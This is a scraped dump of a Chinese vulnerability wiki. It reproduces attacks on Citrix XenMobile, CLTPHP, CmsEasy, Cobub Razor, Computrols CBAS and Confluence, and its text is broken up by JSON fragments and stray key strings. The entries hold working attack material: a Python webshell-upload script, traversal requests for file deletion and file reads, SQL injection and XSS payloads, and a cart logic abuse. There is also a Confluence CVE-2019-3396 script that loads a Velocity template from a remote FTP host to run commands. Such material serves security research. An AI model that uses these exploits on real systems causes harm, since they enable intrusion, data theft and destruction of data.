WKS=CAVRK9/5+r5esY+bvrZJ1g== SK=jTyjyNsyFbkrCnaI9Gq/0GVUp1fkq8nd+VHLe35T0rmmm8z7osNtgfSNPFulSSJ1 SKS=CF5ebQ== UD.GK=69ict40YlMC9E1a2Tcgu3UVb0Lkd5RyadcQ4SEwcbKlUCR8Tv4lGv6N6BkirKk7l GKS=4GLRGw== 使用算法对每个参数P.TXT1，P.TXT2，P.TXT3进行哈希处理 并指.txt文件夹中的文件/opt/sas/rt/keys/。这些相同的步骤由库完成libsecure.so。 from base64 import b64encode from hashlib import sha256 print(b64encode(sha256(b'vfjgegdwecmykhbispfg').digest()).decode('ascii').translate({47:None,61:None})) print(b64encode(sha256(b'mbezvftvzwjopiruwewm').digest()).decode('ascii').translate({47:None,61:None})) print(b64encode(sha256(b'gzaoaxmebrgffquankdx').digest()).decode('ascii').translate({47:None,61:None})) 生成的文件名WbuGF1z7N+0EsLTTCE3JoRNgAJJzVe7Gs5JWhp3qJE.txt，lQGKrlfWtad61mxyFkUWNi2vF7INdfOfiXzVX1I95g.txt和 NZc0GgHcLK4qzgdQdQ0V50EorrksnJFdu1zIIlxx1j8.txt可以用于使用路径遍历漏洞从服务器下载相应的文件。 /opt/sas/sw/lib/libsecure.so还需要用于加密的库。 当务之急是这些文件（security.properties，WbuGF1z7N+0EsLTTCE3JoRNgAJJzVe7Gs5JWhp3qJE.txt，lQGKrlfWtad61mxyFkUWNi2vF7INdfOfiXzVX1I95g.txt，NZc0GgHcLK4qzgdQdQ0V50EorrksnJFdu1zIIlxx1j8.txt，libsecure.so），以保存到本地，他们有XenMobile服务器上的同一个文件的路径。 还需要三个Java库，保存到一个文件夹：/opt/sas/sw/tomcat/inst1/webapps/ROOT/WEB-INF/lib/DataSecurity.jar，/opt/sas/sw/tomcat/inst1/webapps/ROOT/WEB-INF/lib/common-interfaces.jar，/opt/sas/sw/tomcat/inst1/webapps/ROOT/WEB-INF/lib/slf4j-api-1.6.4.jar。 在上述文件夹中，创建一个decrypt.class包含以下内容的文件并进行编译。 import com.citrix.xms.security.DataSecurity; class decrypt { public static void main(String[] args) { if (args.length 通过正确排列所有数据，我们可以从配置文件中解密密码。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:30 "},"Web安全/Citrix/（CVE-2020-ianianian）Citrix 目录遍历漏洞/（CVE-2020-ianianian）Citrix 目录遍历漏洞.html":{"url":"Web安全/Citrix/（CVE-2020-ianianian）Citrix 目录遍历漏洞/（CVE-2020-ianianian）Citrix 目录遍历漏洞.html","title":"（CVE-2020-ianianian）Citrix 目录遍历漏洞","keywords":"","body":"（CVE-2020-ianianian）Citrix 目录遍历漏洞 一、漏洞简介 我也不知道cve编号是多少，有知道的师傅可以告诉我一下。 二、漏洞影响 Citrix ADC and Citrix Gateway: \\ Citrix ADC and NetScaler Gateway: \\ Citrix ADC and NetScaler Gateway: \\ Citrix ADC and NetScaler Gateway: \\ NetScaler ADC and NetScaler Gateway: \\ Citrix SD-WAN WANOP: \\ Citrix SD-WAN WANOP: \\ Citrix SD-WAN WANOP: \\ Citrix Gateway Plug-in for Linux: \\ 三、复现过程 GET /msn/randomname/../ HTTP/1.1 Host: www.0-sec.org User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Cookie: startupapp=neo; is_cisco_platform=0; stst=stst; uatz=uatz; drep=Jemoeder; st_splitter=350px; rdx_pagination_size=25%20Per%20Page; SESSID=9ed492e6ff1876d44ddcaec143d2f949 Upgrade-Insecure-Requests: 1 2.png Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:32 "},"Web安全/CLTPHP/CLTPHP 5.5.3 任意文件上传漏洞/CLTPHP 5.5.3 任意文件上传漏洞.html":{"url":"Web安全/CLTPHP/CLTPHP 5.5.3 任意文件上传漏洞/CLTPHP 5.5.3 任意文件上传漏洞.html","title":"CLTPHP 5.5.3 任意文件上传漏洞","keywords":"","body":"CLTPHP 5.5.3 任意文件上传漏洞 一、漏洞简介 CLTPHP采用ThinkPHP开发，后台采用Layui框架的内容管理系统。 二、漏洞影响 CLTPHP 5.5.3 三、复现过程 找到一个注册界面 随便注册一个用户，登陆后在设置里找到一个上传点 上传我们的一句话木马 查看返回包，上传成功 访问失败，猜测返回路径可能不是绝对路径 通过报错信息查找关键词，发现存在public目录 那再把public加上再试试~ success！ 菜刀连接 poc payload.py #!/usr/bin/python #-*- coding: UTF-8 -*- #Author：Bypass #Date：2018.03.01 import requests import sys def CLPHP_upload(url): header = { 'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)' , 'X-Requested-With': 'XMLHttpRequest',} geturl = url+\"/user/upFiles/upload\" files ={'file':('1.php',open('1.php','rb'),'image/jpeg')} res = requests.post(geturl, files=files,headers=header) print res.text if __name__ == \"__main__\": if len(sys.argv) == 2: url=sys.argv[1] CLPHP_upload(url) sys.exit(0) else: print (\"usage: %s xxx.com \" % sys.argv[0]) sys.exit(-1) 使用方法：把payload.py和一句话.php放到同一文件夹下， cmd执行 python payload.py www.0-sec.org 参考链接 https://www.cnblogs.com/unixcs/p/11244463.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:33 "},"Web安全/CLTPHP/CLTPHP 5.8 后台任意文件删除漏洞/CLTPHP 5.8 后台任意文件删除漏洞.html":{"url":"Web安全/CLTPHP/CLTPHP 5.8 后台任意文件删除漏洞/CLTPHP 5.8 后台任意文件删除漏洞.html","title":"CLTPHP 5.8 后台任意文件删除漏洞","keywords":"","body":"CLTPHP 5.8 后台任意文件删除漏洞 一、漏洞简介 CLTPHP是基于ThinkPHP5开发，后台采用Layui框架的内容管理系统， 二、漏洞影响 CLTPHP 5.8及之前版本 三、复现过程 漏洞分析 app/admin/controller/Database.php 第221-248行： public function delSqlFiles() { $batchFlag = input('param.batchFlag', 0, 'intval'); //批量删除 if ($batchFlag) { $files = input('key', array()); }else { $files[] = input('sqlfilename' , ''); } if (empty($files)) { \\10. $result['msg'] = '请选择要删除的sql文件!'; \\11. $result['code'] = 0; \\12. return $result; \\13. } \\14. \\15. foreach ($files as $file) { \\16. $a = unlink($this->datadir.'/' . $file); \\17. } \\18. if($a){ \\19. $result['msg'] = '删除成功!'; \\20. $result['url'] = url('restore'); \\21. $result['code'] = 1; \\22. return $result; \\23. }else{ \\24. $result['msg'] = '删除失败!'; \\25. $result['code'] = 0; \\26. return $result; \\27. } \\28. } 在这段函数中，参数sqlfilename未经任何处理，直接带入unlink函数中删除，导致程序在实现上存在任意文件删除漏洞，攻击者可通过该漏洞删除任意文件。 漏洞复现 构造URL，成功删除根目录的1.txt文件 http://www.0-sec.org/admin/Database/delSqlFiles.html POST: sqlfilename=..\\\\..\\\\1.txt 修复建议 对于要删除的文件，通过正则判断用户输入的参数的格式，看输入的格式是否合法。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:35 "},"Web安全/CmsEasy/ CmsEasy 7.3.8 sql注入漏洞/ CmsEasy 7.3.8 sql注入漏洞 .html":{"url":"Web安全/CmsEasy/ CmsEasy 7.3.8 sql注入漏洞/ CmsEasy 7.3.8 sql注入漏洞 .html","title":" CmsEasy 7.3.8 sql注入漏洞 ","keywords":"","body":"CmsEasy 7.3.8 sql注入漏洞 一、漏洞简介 二、漏洞影响 CmsEasy 7.3.8 三、复现过程 漏洞代码位于lib/admin/language_admin.php的add_action函数 在测试后发现CmsEasy V7.3.8框架已经对SQLi进行了转义和过滤，包括（select、* 、sleep等等），为了确定具体的过滤名单，从源码中查找检测函数 但是经过一番搜索后，源码中发现实际调用的注入检测函数并没有被定义，仔细研究后确定是在几个加密混淆的核心代码中实现了。。（闭源一定意味着安全吗？）------通过一番周折后得到函数 显而易见，这样简单的过滤很容易被部分SQLi关键组成字符绕过，导致SQL注入，例如，可以使用benchmark函数来代替sleep以达到基于时间的注入。除了通过得到源码来明确黑名单的，用fuzz同样可以得到过滤的黑名单，之后再想办法绕过 而类似的漏洞成因在同一个文件的edit_action函数中也存在 这两处接口都存在SQL注入漏洞，提交的payload绕过过滤黑名单后可以进行利用 参考链接 https://xz.aliyun.com/t/7273 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:37 "},"Web安全/CmsEasy/ CmsEasy 7.3.8 任意文件操作/ CmsEasy 7.3.8 任意文件操作 .html":{"url":"Web安全/CmsEasy/ CmsEasy 7.3.8 任意文件操作/ CmsEasy 7.3.8 任意文件操作 .html","title":" CmsEasy 7.3.8 任意文件操作 ","keywords":"","body":"CmsEasy 7.3.8 任意文件操作 一、漏洞简介 二、漏洞影响 CmsEasy 7.3.8 三、复现过程 \"无需代码，自由拖拽布局，适应所有设备\"是这个系统宣传的特色，后台自然地存在自定义网站模板功能，这种功能中如果处理不当很可能造成文件任意读、写或者删除的脆弱性问题，需要着重注意。 观察模板编辑功能，存在对模板的html文件的读取操作，对应到HTTP请求可以明显看到可控参数 看到功能不急着看代码，首先想到黑盒测试一下，手动修改id参数后观察发现可以这个接口果然没有做好限制和过滤，可以读取任意传参文件 观察接口URL中的参数，猜测除了fetch之外应该还有保存和删除的功能，但是功能接口的接收参数就不知道了，因此需要去看源码以进行下一步操作 定位到接口的功能函数文件后，发现经过了加密混淆处理。。。 经过一番操作后，最终得到了文件删除的接口函数大致内容，很明显地存在文件删除路径可控问题 同理，文件写也存在问题，这里就不详细列出了，感兴趣的朋友可以再看看 参考链接 https://xz.aliyun.com/t/7273 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:39 "},"Web安全/CmsEasy/ CmsEasy 7.3.8 本地文件包含漏洞/ CmsEasy 7.3.8 本地文件包含漏洞 .html":{"url":"Web安全/CmsEasy/ CmsEasy 7.3.8 本地文件包含漏洞/ CmsEasy 7.3.8 本地文件包含漏洞 .html","title":" CmsEasy 7.3.8 本地文件包含漏洞 ","keywords":"","body":"CmsEasy 7.3.8 本地文件包含漏洞 一、漏洞简介 二、漏洞影响 CmsEasy 7.3.8 三、复现过程 CmsEasy V7.3.8框架后端的语言编辑功能函数接口对include的文件路径没有做安全性校验，攻击者可以通过该接口包含上传的带有PHP代码内容的任意后缀（合法）文件，导致远程代码执行 漏洞代码位置是位于CmsEasy_7.3.8_UTF-8_20191230/lib/admin/language_admin.php文件中的edit_action函数 $lang_choice是从用户的GET请求参数中直接获取的，$langurlname是从数据库中获取的langurlname字段。后面将这两个参数直接拼接路劲赋值给$path，这里的$lang_choice拼接在最后，可以任意赋值（为后面文件包含导致命令执行奠定基础）。 接着由于266行判断POST参数是否有submit，我们可以直接不传这个参数来绕开这一段的代码执行，到299行直接通过inlcude函数包含我们任意传递的值，导致文件包含 CmsEasy对于任何用户存在文件和图片上传功能，虽然我们不能直接上传php文件（默认禁止），但是可以上传内容为php代码的图片后缀文件，因此可以通过这一处文件包含达到最后高危的命令执行问题 参考链接 https://xz.aliyun.com/t/7273 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:41 "},"Web安全/CmsEasy/CmsEasy 7.6.3.2_20200422 逻辑漏洞/CmsEasy 7.6.3.2_20200422 逻辑漏洞.html":{"url":"Web安全/CmsEasy/CmsEasy 7.6.3.2_20200422 逻辑漏洞/CmsEasy 7.6.3.2_20200422 逻辑漏洞.html","title":"CmsEasy 7.6.3.2_20200422 逻辑漏洞","keywords":"","body":"CmsEasy 7.6.3.2_20200422 逻辑漏洞 一、漏洞简介 二、漏洞影响 CmsEasy 7.6.3.2 三、复现过程 1.登录任意账号 图片 1.png 2.点击任意产品 图片 2.png 3.点开任意一个产品，前提是有余量 图片 3.png 4.输入任意正常数量，burp开启抓包，点击添加到购物车 图片 4.png 5.将抓到的包中的最后一个数字改为负数 图片 5.png 图片 6.png 然后放包 GET /index.php?case=archive&act=doorders&aid=527&datatype=&thisnum=-100 HTTP/1.1 Host: www.0-sec.org Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3314.0 Safari/537.36 SE 2.X MetaSr 1.0 Referer: http://localhost/index.php?case=archive&act=show&aid=527 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=5j671r8cg9kfppbkpl7i0n1te0; loginfalse=0; login_username=admin; login_password=787cc8f99d30dc9cbeeadd77f99efb84; ce_orders_cookie=TL%2BA8RODL9PeNwoN Connection: close 6.此时可以看到购物车中为负数 图片 7.png 7.查看个人中心中的余额，为5600 图片 8.png 8.点击购物车 图片 9.png 9.点击下图内容 图片 10.png 10.填写完成之后，点击在线支付 图片 11.png 11.选择余额支付，点击购买 图片 12.png 12.购买成功 图片 13.png 13.回到个人中心，可以看到余额的变化 图片 14.png Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:43 "},"Web安全/Cobub Razor/（CVE-2018-7720）Cobub Razor 0.7.2 存在跨站请求伪造漏洞/（CVE-2018-7720）Cobub Razor 0.7.2 存在跨站请求伪造漏洞.html":{"url":"Web安全/Cobub Razor/（CVE-2018-7720）Cobub Razor 0.7.2 存在跨站请求伪造漏洞/（CVE-2018-7720）Cobub Razor 0.7.2 存在跨站请求伪造漏洞.html","title":"（CVE-2018-7720）Cobub Razor 0.7.2 存在跨站请求伪造漏洞","keywords":"","body":"（CVE-2018-7720）Cobub Razor 0.7.2 存在跨站请求伪造漏洞 一、漏洞简介 Cobub Razor 0.7.2存在跨站请求伪造漏洞，管理员登陆后访问特定页面可增加管理员账号。保存如下利用代码为html页面，打开页面将增加test123/test的管理员账号。 二、漏洞影响 Cobub Razor 0.7.2 三、复现过程 POC alert(document.cookie) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:43 "},"Web安全/Cobub Razor/（CVE-2018-7745）Cobub Razor 0.7.2 越权增加管理员账户/（CVE-2018-7745）Cobub Razor 0.7.2 越权增加管理员账户.html":{"url":"Web安全/Cobub Razor/（CVE-2018-7745）Cobub Razor 0.7.2 越权增加管理员账户/（CVE-2018-7745）Cobub Razor 0.7.2 越权增加管理员账户.html","title":"（CVE-2018-7745）Cobub Razor 0.7.2 越权增加管理员账户","keywords":"","body":"（CVE-2018-7745）Cobub Razor 0.7.2 越权增加管理员账户 一、漏洞简介 Cobub Razor 0.7.2越权增加管理员账户漏洞，在不登录的情况下发送特定数据包，可新增管理员账号。保存如下利用代码为html页面，打开页面将增加test/test123的管理员账号，漏洞发现者已经将漏洞信息通过issues告知作者。 二、漏洞影响 Cobub Razor 0.7.2 三、复现过程 POC history.pushState('', '', '/') Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:44 "},"Web安全/Cobub Razor/（CVE-2018-8056_CVE-2018-8770）Cobub Razor 0.8.0 存在物理路径泄露漏洞/（CVE-2018-8056_CVE-2018-8770）Cobub Razor 0.8.0 存在物理路径泄露漏洞.html":{"url":"Web安全/Cobub Razor/（CVE-2018-8056_CVE-2018-8770）Cobub Razor 0.8.0 存在物理路径泄露漏洞/（CVE-2018-8056_CVE-2018-8770）Cobub Razor 0.8.0 存在物理路径泄露漏洞.html","title":"（CVE-2018-8056_CVE-2018-8770）Cobub Razor 0.8.0 存在物理路径泄露漏洞","keywords":"","body":"（CVE-2018-8056/CVE-2018-8770）Cobub Razor 0.8.0 存在物理路径泄露漏洞 一、漏洞简介 二、漏洞影响 Cobub Razor 0.8.0 三、复现过程 POC 方法一： URL: http://localhost/export.php HTTP Method: GET URL: http://localhost/index.php?/manage/channel/addchannel HTTP Method: POST Data: channel_name=test\"&platform=1 方法二：> Cobub Razor 0.8.0存在物理路径泄露漏洞，当访问特定url时，系统会显示物理路径信息。Cobub Razor是一个在github上开源的系统。 HTTP Method: GET http://localhost/tests/generate.php http://localhost/tests/controllers/getConfigTest.php http://localhost/tests/controllers/getUpdateTest.php http://localhost/tests/controllers/postclientdataTest.php http://localhost/tests/controllers/posterrorTest.php http://localhost/tests/controllers/posteventTest.php http://localhost/tests/controllers/posttagTest.php http://localhost/tests/controllers/postusinglogTest.php http://localhost/tests/fixtures/Controller_fixt.php http://localhost/tests/fixtures/Controller_fixt2.php http://localhost/tests/fixtures/view_fixt2.php http://localhost/tests/libs/ipTest.php http://localhost/tests/models/commonDbfix.php Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:45 "},"Web安全/Cobub Razor/（CVE-2018-8057）Cobub Razor 0.8.0 存在SQL注入漏洞/（CVE-2018-8057）Cobub Razor 0.8.0 存在SQL注入漏洞.html":{"url":"Web安全/Cobub Razor/（CVE-2018-8057）Cobub Razor 0.8.0 存在SQL注入漏洞/（CVE-2018-8057）Cobub Razor 0.8.0 存在SQL注入漏洞.html","title":"（CVE-2018-8057）Cobub Razor 0.8.0 存在SQL注入漏洞","keywords":"","body":"（CVE-2018-8057）Cobub Razor 0.8.0 存在SQL注入漏洞 一、漏洞简介 Cobub Razor 0.8.0存在SQL注入漏洞，\"/application/controllers/manage/channel.php\"页面的\"channel_name\"及\"platform\"参数过滤不严格导致存在SQL注入漏洞。Cobub Razor是一个在github上开源的系统，漏洞发现者已经将漏洞信息通过issues告知作者。 二、漏洞影响 Cobub Razor 0.8.0 三、复现过程 POC > http://www.0-sec.org/index.php?/manage/channel/addchannel > POST data: > 1.channel_name=test\" AND (SELECT 1700 FROM(SELECT COUNT(*),CONCAT(0x7171706b71,(SELECT (ELT(1700=1700,1))),0x71786a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- JQon&platform=1 > 2.channel_name=test\" AND SLEEP(5)-- NklJ&platform=1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:45 "},"Web安全/Computrols CBAS Web/（CVE-2019-10846）Computrols CBAS Web反射型xss/（CVE-2019-10846）Computrols CBAS Web反射型xss.html":{"url":"Web安全/Computrols CBAS Web/（CVE-2019-10846）Computrols CBAS Web反射型xss/（CVE-2019-10846）Computrols CBAS Web反射型xss.html","title":"（CVE-2019-10846）Computrols CBAS Web反射型xss","keywords":"","body":"（CVE-2019-10846）Computrols CBAS Web反射型xss 一、漏洞简介 Computrols CBAS Web是美国Computrols公司的一套楼宇自动化系统 二、漏洞影响 Computrols CBAS Web\\ 三、复现过程 1、 POST /cbas/index.php?m=auth&a=verifyid HTTP/1.1 username=\">confirm(document.cookie)&submit_button=Send+Me+a+New+Password+Via+Email 2、 POST /cbas/index.php?m=auth&a=login HTTP/1.1 username=\">htmlinjection&password=&challenge=60753c1b5e449de80e21472b5911594d&response=e16371917371b8b70529737813840c62 3、 GET /cbas/index.php?m=auth&a=login&username=\">my milkshake brings all the boys to the yard.&password=damn_right HTTP/1.1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:45 "},"Web安全/Computrols CBAS Web/（CVE-2019-10848）Computrols CBAS Web 用户名枚举/（CVE-2019-10848）Computrols CBAS Web 用户名枚举.html":{"url":"Web安全/Computrols CBAS Web/（CVE-2019-10848）Computrols CBAS Web 用户名枚举/（CVE-2019-10848）Computrols CBAS Web 用户名枚举.html","title":"（CVE-2019-10848）Computrols CBAS Web 用户名枚举","keywords":"","body":"（CVE-2019-10848）Computrols CBAS Web 用户名枚举 一、漏洞简介 二、漏洞影响 19.0.0及以下 三、复现过程 测试无效用户： POST /cbas/index.php?m=auth&a=login HTTP/1.1 username=randomuser&password=&challenge=60753c1b5e449de80e21472b5911594d&response=e16371917371b8b70529737813840c62 Response randomuser 测试有效用户： POST /cbas/index.php?m=auth&a=login HTTP/1.1 username=admin&password=&challenge=6e4344e7ac62520dba82d7f20ccbd422&response=e09aab669572a8e4576206d5c14befc5s Response Invalid username/password combination. Please try again! Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:46 "},"Web安全/Computrols CBAS Web/（CVE-2019-10852）Computrols CBAS Web SQL注入/（CVE-2019-10852）Computrols CBAS Web SQL注入.html":{"url":"Web安全/Computrols CBAS Web/（CVE-2019-10852）Computrols CBAS Web SQL注入/（CVE-2019-10852）Computrols CBAS Web SQL注入.html","title":"（CVE-2019-10852）Computrols CBAS Web SQL注入","keywords":"","body":"（CVE-2019-10852）Computrols CBAS Web SQL注入 一、漏洞简介 Computrols CBAS-Web经过身份验证的基于布尔的盲SQL注入 二、漏洞影响 19.0.0及以下 三、复现过程 http://www.0-sec.org/cbas/index.php?m=servers&a=start_pulling&id=1 AND 2510 = 2510 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:47 "},"Web安全/Confluence/（CVE-2019-3394）Confluence 文件读取漏洞/（CVE-2019-3394）Confluence 文件读取漏洞.html":{"url":"Web安全/Confluence/（CVE-2019-3394）Confluence 文件读取漏洞/（CVE-2019-3394）Confluence 文件读取漏洞.html","title":"（CVE-2019-3394）Confluence 文件读取漏洞","keywords":"","body":"（CVE-2019-3394）Confluence 文件读取漏洞 一、漏洞简介 （CVE-2019-3394）Confluence 文件读取漏洞 二、影响范围 6.1.0 \\ 6.7.0 \\ 6.14.0 \\ 三、复现过程 poc POST /rest/tinymce/1/macro/preview HTTP/1.1 Host: localhost:8090 Content-Length: 175 Accept: text/plain, */*; q=0.01 Origin: http://localhost:8090 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 Content-Type: application/json; charset=UTF-8 Referer: http://localhost:8090/ Connection: close {\"contentId\":\"1\",\"macro\":{\"name\":\"widget\",\"params\": {\"url\":\"https://www.viddler.com/v/test\",\"width\":\"1000\",\"height\":\"1000\",\"_templat e\":\"file:///C:/Windows/win.ini\"},\"body\":\"\"}} 触发条件 一个有效的登录账号 该账号具有在空间「添加页面」的权限 复现步骤 1.创建一个空白页 Confluence文件读取漏洞/media/rId27.png) 2.插入一张网络图片 image Confluence文件读取漏洞/media/rId28.png) 插入url改为你需要查看的文件，例如 /packages/../web.xml 3.点击发布，抓取报文 4.删除多余url前缀,只留下 /packages/../web.xml 并放开报文 Confluence文件读取漏洞/media/rId29.png) 5.查看页面源码确认修改成功 Confluence文件读取漏洞/media/rId30.png) 6.导出word，并抓包查看 Confluence文件读取漏洞/media/rId31.png) Confluence文件读取漏洞/media/rId32.png) 路径说明 由于 catalina.jar中的 org.apache.catalina.webresources.StandardRoot.class的 getResource方法的 validate存在过滤和限制，所以可遍历路径均在 /WEB-INF下 可读取的文件大致如下 #WEB-INF下 decorators.xml glue-config.xml server-config.wsdd sitemesh.xml urlrewrite.xml web.xml #/WEB-INF/classes下 confluence-filtered-frames.properties confluence-init.properties crowd.properties(较为重要) hash-registry.properties lgplTemplate.soy log4j-diagnostic.properties log4j.properties logging.properties mime.types osuser.xml seraph-config.xml seraph-paths.xml velocity_implicit.vm velocity.properties Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:48 "},"Web安全/Confluence/（CVE-2019-3396）Confluence 路径穿越与命令执行漏洞/（CVE-2019-3396）Confluence 路径穿越与命令执行漏洞.html":{"url":"Web安全/Confluence/（CVE-2019-3396）Confluence 路径穿越与命令执行漏洞/（CVE-2019-3396）Confluence 路径穿越与命令执行漏洞.html","title":"（CVE-2019-3396）Confluence 路径穿越与命令执行漏洞","keywords":"","body":"（CVE-2019-3396）Confluence 路径穿越与命令执行漏洞 一、漏洞简介 Atlassian Confluence是企业广泛使用的wiki系统，其6.14.2版本前存在一处未授权的目录穿越漏洞，通过该漏洞，攻击者可以读取任意文件，或利用Velocity模板注入执行任意命令。 二、漏洞影响 Confluence 1.*.*、2.*.*、3.*.*、4.*.*、5.*.* Confluence 6.0.*、6.1.*、6.2.*、6.3.*、6.4.*、6.5.* Confluence 6.6.* 三、复现过程 发送如下数据包，即可读取文件web.xml： POST /rest/tinymce/1/macro/preview HTTP/1.1 Host: localhost:8090 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8090/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23& Content-Type: application/json; charset=utf-8 Content-Length: 176 {\"contentId\":\"786458\",\"macro\":{\"name\":\"widget\",\"body\":\"\",\"params\":{\"url\":\"https://www.viddler.com/v/23464dc6\",\"width\":\"1000\",\"height\":\"1000\",\"_template\":\"../web.xml\"}}} Confluence路径穿越与命令执行漏洞/media/rId24.png) 6.12以前的Confluence没有限制文件读取的协议和路径，我们可以使用file:///etc/passwd来读取文件，也可以通过https://...来加载远程文件。 该文件是一个Velocity模板，我们可以通过模板注入（SSTI）来执行任意命令： Confluence路径穿越与命令执行漏洞/media/rId25.png) poc 首先需要一台外网的服务器 1.使用FTP加载vm文件 2.修改filename为自己的vm文件路径，例如 filename = \"ftp://192.168.50.181/rce.vm\" 3.python CVE-2019-3396.py [http://ip:port](http://ip) \"whoami\" CVE-2019-3396.py # -*- coding: utf-8 -*- import re import sys import requests def _read(url): result = {} # filename = \"../web.xml\" filename = 'file:////etc/group' paylaod = url + \"/rest/tinymce/1/macro/preview\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\", \"Referer\": url + \"/pages/resumedraft.action?draftId=12345&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&\", \"Content-Type\": \"application/json; charset=utf-8\" } data = '{\"contentId\":\"12345\",\"macro\":{\"name\":\"widget\",\"body\":\"\",\"params\":{\"url\":\"https://www.viddler.com/v/23464dc5\",\"width\":\"1000\",\"height\":\"1000\",\"_template\":\"%s\"}}}' % filename r = requests.post(paylaod, data=data, headers=headers) # print r.content if r.status_code == 200 and \"wiki-content\" in r.text: m = re.findall('.*wiki-content\">n(.*)n n', r.text, re.S) return m[0] def _exec(url,cmd): result = {} filename = \"ftp://192.168.50.181/rce.vm\" paylaod = url + \"/rest/tinymce/1/macro/preview\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\", \"Referer\": url + \"/pages/resumedraft.action?draftId=12345&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&\", \"Content-Type\": \"application/json; charset=utf-8\" } data = '{\"contentId\":\"12345\",\"macro\":{\"name\":\"widget\",\"body\":\"\",\"params\":{\"url\":\"http://www.dailymotion.com/video/xcpa64\",\"width\":\"300\",\"height\":\"200\",\"_template\":\"%s\",\"cmd\":\"%s\"}}}' % (filename,cmd) r = requests.post(paylaod, data=data, headers=headers) # print r.content if r.status_code == 200 and \"wiki-content\" in r.text: m = re.findall('.*wiki-content\">n(.*)n n', r.text, re.S) return m[0] if __name__ == '__main__': url = sys.argv[1] cmd = sys.argv[2] print _exec(url,cmd) rce.vm #set ($e=\"exp\") #set ($a=$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec($cmd)) #set ($input=$e.getClass().forName(\"java.lang.Process\").getMethod(\"getInputStream\").invoke($a)) #set($sc = $e.getClass().forName(\"java.util.Scanner\")) #set($constructor = $sc.getDeclaredConstructor($e.getClass().forName(\"java.io.InputStream\"))) #set($scan=$constructor.newInstance($input).useDelimiter(\"\\A\")) #if($scan.hasNext()) $scan.next() #end 参考链接 https://vulhub.org/\\#/environments/confluence/CVE-2019-3396/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:50 "},"Web安全/Confluence/（CVE-2019-3398）Confluence 路径穿越漏洞/（CVE-2019-3398）Confluence 路径穿越漏洞.html":{"url":"Web安全/Confluence/（CVE-2019-3398）Confluence 路径穿越漏洞/（CVE-2019-3398）Confluence 路径穿越漏洞.html","title":"（CVE-2019-3398）Confluence 路径穿越漏洞","keywords":"","body":"（CVE-2019-3398）Confluence 路径穿越漏洞 一、漏洞简介 二、漏洞影响 2.0.0 \\ 三、复现过程 漏洞分析 首先根据官方描述，downloadallattachments这个资源，结合其验证缓解措施的方式，找到了漏洞触发点： ... =》附件=》下载全部 点击下载全部时，会触发一个GET请求： GET /pages/downloadallattachments.action?pageId=65601 然后响应 Location: /download/temp/downloadi120q121507.zip?contentType=application/zip 而且每次发出downloadallattachments.action请求，其响应的Location路径的zip文件名都不一样，发现原来是服务端每收到一次downloadallattachments.action请求，就会在download/temp/目录下生成一个zip文件： 1.png 搜索了一下，发现这个文件是在/Users/xxx/confluenceHome，也就是confluence的安装目录下。 cqq@ubuntu:~$ find .|grep download45lL6115220.zip ./confluenceHome/temp/download45lL6115220.zip 然后看到这个目录下还有一个attachments目录，为了验证这就是附件上传的目录， 2.png 于是，新建了一个页面，上传了几个文本文件，通过cat出来的内容与上传的内容匹配，判定这个就是上传的附件被存放的目录，但是这个目录下的文件名被重命名了。既然官方说是路径穿越漏洞，就得找到文件名或者文件路径的输入点。在这里上传文件的过程中抓一下包，发现有两个参数是文件名/文件路径相关的，filename和name，经过测试发现漏洞点参数是filename。 漏洞复现 通过一番grep -rn xxx *的查找，发现需要两步来完成对路径穿越的利用。 1、POST 